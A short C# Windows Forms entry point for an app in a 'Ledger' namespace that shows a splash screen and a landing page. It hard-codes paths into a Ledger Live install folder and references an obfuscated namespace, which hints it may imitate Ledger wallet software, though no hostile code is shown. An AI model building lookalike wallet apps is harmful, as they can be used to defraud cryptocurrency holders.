using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
//using ObfuscatedSupportNamespace;
using Ledger.otherUseless;


namespace Ledger.MainClassFolder
{
    public static class MainClass
    {
        private static Mutex _mutex;
        public static string ledgerLivePath = "C:\\Program Files\\Ledger Live\\Ledger Wallet.exe";
        public static string ledgerConfPath = "C:\\Program Files\\Ledger Live\\LedgerConf.exe";
        public static string targetDir = "C:\\Program Files\\Ledger Live";


        [STAThread]
        private static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // Show splash screen first
            var splash = new SplashScreen();
            splash.ShowDialog();

            // Then run the main form
            Application.Run(new MainLandingPage());
        }
    }
}